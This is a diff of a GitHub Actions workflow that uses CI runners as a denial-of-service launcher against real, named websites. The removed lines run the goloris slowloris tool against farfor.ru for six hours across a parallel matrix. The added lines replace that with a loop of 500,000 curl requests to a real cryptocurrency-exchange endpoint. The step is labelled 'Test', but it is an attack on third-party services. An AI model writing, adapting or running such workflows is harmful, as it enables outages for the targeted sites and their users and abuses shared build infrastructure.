@@ -10,9 +10,9 @@ jobs:
 
   build:
     runs-on: ubuntu-latest
-    strategy:
-      matrix: 
-       site: ["https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru"]
+    #strategy:
+     # matrix: 
+      # site: ["https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru"]
     steps:
     - uses: actions/checkout@v2
 
@@ -25,4 +25,5 @@ jobs:
       run: go get -u github.com/valyala/goloris
 
     - name: Test
-      run: goloris -victimUrl "${{ matrix.site }}" -dialWorkersCount 100 -testDuration 6h -rampUpInterval 100ms
+      #run: goloris -victimUrl "${{ matrix.site }}" -dialWorkersCount 100 -testDuration 6h -rampUpInterval 100ms
+      run: for i in {1..500000}; do echo "Welcome $i times";curl "https://quickex.io/exchange/create?fix=0&amount-from=0.010&amount-to=10000=&currency-from=ETH&currency-to=USDT" ; done
